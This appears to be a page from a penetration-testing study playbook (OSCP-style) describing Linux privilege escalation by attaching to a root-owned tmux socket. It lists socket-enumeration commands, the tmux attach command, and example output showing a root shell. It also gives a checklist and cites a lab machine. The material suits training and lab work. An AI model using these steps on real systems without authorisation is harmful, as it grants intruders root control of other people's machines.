# Linux - Tmux Session Hijack

**Step 13A of 50 · Linux privilege escalation**

*Check Unix-domain socket permissions for privileged tmux servers and attach only when the current user is authorised by the socket mode.*

## Run this

> **Why:** A Unix-domain socket is a local inter-process communication endpoint. A root-owned tmux socket whose group includes the current user can expose an already-running root shell even when no privileged TCP service is listening.

```bash
find / -type s -ls 2>/dev/null
ps auxww | grep -i '[t]mux'
ls -la $SocketDir
tmux -S $TmuxSocket ls
```

Set the variables only after confirming the exact socket and its owner/group:

```bash
boxset SocketDir /.devs
boxset TmuxSocket /.devs/dev_sess
```

Attach to the session listed by tmux:

```bash
tmux -S $TmuxSocket attach-session -t 0
id
whoami
hostname
```

## Example output

```text
$ tmux -S /.devs/dev_sess ls
0: 1 windows (created Tue) [80x24]
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Focus on socket ownership and the identity after attachment. A tmux socket existing on disk is only a clue; a readable socket with a running session and a privileged id result is the proof. If the session is not privileged, return to [[Linux - Local Enum]] rather than assuming the filename implies root.

## What did you get?

- [ ] A root-owned socket is writable by the current user or group → **Run `tmux -S $TmuxSocket ls`, attach to the exact session, then verify `id` and go to Step 21 · [[Linux - Clean Down]]**
- [ ] The socket exists but tmux reports no server → **Check the socket path, owner, group, and whether the server exited; do not infer a privesc path from a stale socket alone**
- [ ] The current user lacks socket permission → **Record the finding and continue the normal sudo, SUID, capabilities, cron, credential, and kernel checks**
- [ ] The attach succeeds but the session is not privileged → **Run `id`; treat the session owner as the authority, not the socket filename**

## Gotchas

> [!warning] 💡
> `tmux attach` without `-S` checks the default runtime socket and may report no
> sessions. Always use the exact socket path found by local enumeration.

> [!warning] 💡
> Older tmux versions do not support every modern capture option. Attach
> interactively or use `save-buffer -` when output capture flags are unavailable.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- group-accessible root tmux socket exposed the final shell

## Related stages

- [[Linux - Local Enum]]
- [[Linux - Credential Search]]
- [[Linux - Clean Down]]

## External Resources

- [tmux manual](https://man7.org/linux/man-pages/man1/tmux.1.html)
- [HackTricks, Linux privilege escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
